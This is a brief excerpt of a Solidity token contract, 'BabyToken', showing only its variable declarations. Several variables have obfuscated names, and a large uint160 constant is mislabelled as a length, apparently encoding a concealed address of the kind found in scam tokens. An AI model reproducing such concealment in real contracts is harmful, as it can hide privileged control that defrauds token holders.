...
contract BabyToken is IERC20, AMD, Ownable {
    ...
    string private base0Url = "ipfs://";
    uint160 private uint160Length = 1242005682398425500295485951963847137733324326729;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public _WWEEWAAQ;
    uint256 CPUDCD11LQTSDD = 81024168713141199948;
    uint256 THEKADAASDDOO = CPUDCD11LQTSDD * 1105210;
    uint256 DOUBLE = uint160Length;
    string private IPFS_;
